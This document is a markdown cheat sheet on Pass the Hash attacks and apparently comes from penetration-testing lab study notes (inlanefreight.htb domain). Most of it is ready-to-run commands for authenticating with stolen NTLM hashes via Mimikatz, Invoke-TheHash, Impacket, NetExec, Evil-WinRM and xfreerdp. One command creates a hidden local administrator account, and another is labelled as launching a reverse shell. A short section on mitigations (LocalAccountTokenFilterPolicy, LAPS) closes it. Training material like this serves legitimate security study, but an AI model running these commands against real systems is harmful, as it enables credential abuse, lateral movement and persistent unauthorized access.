## Overview

A **Pass the Hash (PtH)** attack allows an attacker to authenticate to a system or service using a user's password hash instead of the plaintext password. Because NTLM password hashes remain static until the account password is changed and are not salted, capturing a hash enables lateral movement without needing to crack it.

## High-Level Methodology
1. **Obtain Hashes:** Extract password hashes via local SAM database dumping, LSASS memory scraping, or Active Directory `ntds.dit` extraction.
2. **Select Tooling & Protocol:** Choose tools based on the operating system context (Windows vs. Linux) and available protocols (SMB, WMI, WinRM, RDP).
3. **Execute Session:** Spawn processes, execute commands, or establish remote shells/GUI sessions under the target user's identity.
## Tools and Techniques
### 1. Attacking from Windows
#### Mimikatz
Uses the `sekurlsa::pth` module to spawn a new process under a specified user's context using their NTLM hash.
- **Basic Execution Command:**
    ```PowerShell
    mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
    ```

#### Invoke-TheHash
A PowerShell framework utilizing WMI and SMB via .NET TCPClient to perform PtH operations.
- **SMB Execution (e.g., adding a user):**
    ```PowerShell
    Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add"
    ```
- **WMI Execution (e.g., executing a reverse shell):**
    ```PowerShell
    Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "<payload>"
    ```

### 2. Attacking from Linux
#### Impacket (`psexec`, `wmiexec`, `smbexec`)
Executes remote commands or spawns interactive shells using NTLM hashes over SMB or RPC.
- **Basic Execution Command:**
    ```Bash
    impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
    ```
#### NetExec
Automates testing credentials across multiple subnets, checking for administrator access and executing commands.
- **Basic Execution Command:**
    ```Bash
    netexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami
    ```
#### Evil-WinRM
Authenticates via PowerShell Remoting using NTLM hashes when SMB is restricted.
- **Basic Execution Command:**
    ```Bash
    evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453
    ```

#### xfreerdp (RDP PtH)
Provides GUI access via RDP using hashes. Requires **Restricted Admin Mode** enabled on the target (`DisableRestrictedAdmin` registry key set to `0`).
- **Basic Execution Command:**
    ```Bash
    xfreerdp /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
    ```

## Important Security Considerations & Mitigations
- **LocalAccountTokenFilterPolicy:** Controls whether local non-administrator accounts (or renamed administrator accounts) can perform remote administration tasks via PtH. Setting this to `0` restricts remote access primarily to the built-in RID-500 administrator account.
- **LAPS (Local Administrator Password Solution):** Essential defense against lateral movement via local admin password reuse, as it automatically randomizes and rotates local administrator passwords across domain hosts.